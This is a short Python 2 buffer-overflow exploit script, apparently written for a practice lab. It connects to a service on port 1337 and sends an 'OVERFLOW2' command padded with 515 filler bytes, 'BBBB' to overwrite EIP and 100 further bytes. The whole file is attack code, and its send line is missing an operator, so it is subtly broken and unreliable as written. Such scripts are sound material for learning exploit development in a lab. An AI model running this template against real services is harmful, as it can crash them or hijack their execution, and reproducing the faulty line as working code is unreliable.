#!/usr/bin/python

import sys
import socket, time
from struct import *


remoteip="10.10.108.245"
remoteport=1337
offset = "A" * 515
eip = "BBBB"
esp = "C" * 100
buffer = offset + eip + esp

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((remoteip, remoteport))

print s.recv(1024)
s.send("OVERFLOW2 "buffer + '\r\n')
print s.recv(1024)
s.close()
time.sleep(1)
print "-------------------------"
